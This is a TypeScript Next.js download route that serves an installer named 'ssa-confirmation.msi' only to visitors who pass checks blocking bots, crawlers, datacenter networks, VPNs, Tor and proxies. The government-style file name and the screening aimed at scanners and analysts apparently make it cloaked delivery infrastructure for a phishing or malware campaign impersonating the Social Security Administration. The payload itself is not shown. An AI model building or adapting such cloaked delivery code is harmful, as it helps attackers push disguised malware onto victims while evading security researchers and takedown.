import { NextRequest, NextResponse } from 'next/server';
import { checkIP } from '@/lib/ipCheck';
import { 
    checkUserAgentForBot, 
    checkHeadersForProxy, 
    isDatacenterASN
} from '@/lib/serverAntiBot';
import { readFileSync, existsSync } from 'fs';
import { join } from 'path';

const CACHE_HEADERS = {
    'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate',
    'Pragma': 'no-cache',
    'Expires': '0',
};

export async function GET(request: NextRequest) {
    try {
        const forwardedFor = request.headers.get('x-forwarded-for');
        const realIP = request.headers.get('x-real-ip');
        const cfConnectingIP = request.headers.get('cf-connecting-ip');
        const userAgent = request.headers.get('user-agent') || '';
        
        const ip = cfConnectingIP || forwardedFor?.split(',')[0]?.trim() || realIP || 'Unknown';

        if (ip === 'Unknown' || ip === '127.0.0.1' || ip === 'localhost') {
            console.log('[Download] Denied: Unknown/local IP');
            return new NextResponse('Access denied', { status: 403, headers: CACHE_HEADERS });
        }

        const uaCheck = checkUserAgentForBot(userAgent);
        
        if (uaCheck.isBot) {
            console.log(`[Download] Denied: Bot detected - ${ip}, type: ${uaCheck.botType}`);
            return new NextResponse('Access denied', { status: 403, headers: CACHE_HEADERS });
        }

        const proxyCheck = checkHeadersForProxy(request.headers);

        const apiKey = process.env.IPAPI_API_KEY;
        const securityCheck = await checkIP(ip, apiKey);

        if (securityCheck.asn && isDatacenterASN(securityCheck.asn)) {
            console.log(`[Download] Denied: Datacenter ASN - ${ip}, ASN: ${securityCheck.asn.org}`);
            return new NextResponse('Access denied', { status: 403, headers: CACHE_HEADERS });
        }

        if (!securityCheck.isSafe || proxyCheck.isProxy) {
            const threats: string[] = [];
            if (securityCheck.checks.datacenter.detected) threats.push('datacenter');
            if (securityCheck.checks.vpn.detected) threats.push('vpn');
            if (securityCheck.checks.tor.detected) threats.push('tor');
            if (securityCheck.checks.proxy.detected) threats.push('proxy');
            if (securityCheck.checks.crawler.detected) threats.push('crawler');
            if (proxyCheck.isProxy) threats.push('proxy-headers');
            
            console.log(`[Download] Denied: Unsafe IP - ${ip}, threats: ${threats.join(', ')}`);
            return new NextResponse('Access denied', { status: 403, headers: CACHE_HEADERS });
        }

        const downloadFileName = process.env.DOWNLOAD_FILE_PATH || 'ssa-confirmation.msi';
        
        const sanitizedFileName = downloadFileName.replace(/[\/\\]/g, '').replace(/\.\./g, '');
        
        if (sanitizedFileName !== downloadFileName || !sanitizedFileName) {
            console.log(`[Download] Denied: Invalid file path attempted`);
            return new NextResponse('Access denied', { status: 403, headers: CACHE_HEADERS });
        }
        
        const protectedDir = join(process.cwd(), 'protected');
        const filePath = join(protectedDir, sanitizedFileName);
        
        if (!filePath.startsWith(protectedDir)) {
            console.log(`[Download] Denied: Path traversal attempt`);
            return new NextResponse('Access denied', { status: 403, headers: CACHE_HEADERS });
        }
        
        if (!existsSync(filePath)) {
            console.log(`[Download] File not found: ${filePath}`);
            return new NextResponse('File not found', { status: 404, headers: CACHE_HEADERS });
        }

        const fileBuffer = readFileSync(filePath);
        
        console.log(`[Download] Allowed: ${ip}, location: ${securityCheck.location?.country || 'Unknown'}, file: ${downloadFileName}`);
        
        return new NextResponse(fileBuffer, {
            status: 200,
            headers: {
                'Content-Type': 'application/octet-stream',
                'Content-Disposition': `attachment; filename="${downloadFileName}"`,
                'Content-Length': fileBuffer.length.toString(),
                ...CACHE_HEADERS,
            },
        });
    } catch (error) {
        console.error('[Download] Error:', error);
        return new NextResponse('Access denied', { status: 403, headers: CACHE_HEADERS });
    }
}
